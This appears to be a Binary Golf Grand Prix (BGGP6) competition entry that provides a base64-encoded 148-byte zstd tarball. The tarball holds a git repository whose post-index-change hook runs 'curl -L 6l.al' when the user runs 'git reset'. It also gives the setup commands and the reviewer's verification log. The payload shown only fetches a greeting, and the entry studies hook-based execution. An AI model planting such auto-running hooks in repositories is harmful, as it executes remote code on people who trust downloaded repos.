## Entry Info

- Date: 18.1.2026
- BGGP Challenge: 5+6
- Name: dominikr
- Contact Info: 
- Online Presence: -
- Writeup Link:


## File Info

- Target File Type: Tarball containing a git repo
- Target File Size: 148 bytes
- SHA256 Hash: 6e6f1ff11ee8909c4ed932b50079eaf32600bdc38f52a2698067940afa6e5f4b

### File Contents

```
KLUv/QAQXQQAgkYXG3C3OoAQGUGt8d8vteGP5csSCLq2ssDW+//1pvEoYjsEdOJEPGblWEPmUB5K
dIFZUKWySfQgpfJEj5H0/DrFav8HAIIBr120vjYg8uz/ly3+Nnea9Ex1gUVqDYRIECBwK6zb8Oov
o5Jy4089QBRwLtQBA5oMVSv4TA2cSr4nGzAGXyqqScS0lg==
```

## Environment Info

### Target Software and Version

Recent-ish Linux with bash/git/tar/zstd/curl installed

### Environment Setup

Put in a file, e.g. "bggp6-repo.tgz"

Extract tarball:
```
dominik@VM:~$ tar xf bggp6-repo.tgz
```

Go to the bggp6 folder:
```
dominik@VM:~$ cd bggp6/
```

Make sure the repo is clean:
```
dominik@VM:~/bggp6$ git reset
```

You have been pwned:
```
Another #BGGP6 download!!!!!! Hi @binarygolf https://binary.golf/6
```

## Additional Info

Don't think I can do a writeup for this in time....
* golfed git repo
* in a golfed tar file
* with a golfed hook script
* uses the same custom tar as my other entry #175
* ...actually has some changed code to handle directories
* not actually a gzip but a zstd file, but modern GNU tar recognizes it correctly
* don't trust git repos that you download


## Verification 

Issue: https://github.com/binarygolf/BGGP/issues/178

- Reviewer: netspooky
- Review Date: 2026-03-14
- SHA256: 6e6f1ff11ee8909c4ed932b50079eaf32600bdc38f52a2698067940afa6e5f4b
- Score: 4204 [ Base: 3948 (4096 - 148) +256 (BGGP5) ]
- Note: works as is


```
$ base64 -d <<< KLUv/QAQXQQAgkYXG3C3OoAQGUGt8d8vteGP5csSCLq2ssDW+//1pvEoYjsEdOJEPGblWEPmUB5KdIFZUKWySfQgpfJEj5H0/DrFav8HAIIBr120vjYg8uz/ly3+Nnea9Ex1gUVqDYRIECBwK6zb8Oovo5Jy4089QBRwLtQBA5oMVSv4TA2cSr4nGzAGXyqqScS0lg== > bggp6-repo.tgz

$ sha256sum bggp6-repo.tgz 
6e6f1ff11ee8909c4ed932b50079eaf32600bdc38f52a2698067940afa6e5f4b  bggp6-repo.tgz

$ cd bggp6/

# LOL nice!
$ cat .git/hooks/post-index-change 
curl -L 6l.al

$ git reset
Another #BGGP6 download!!!!!! Hi @binarygolf https://binary.golf/6
```
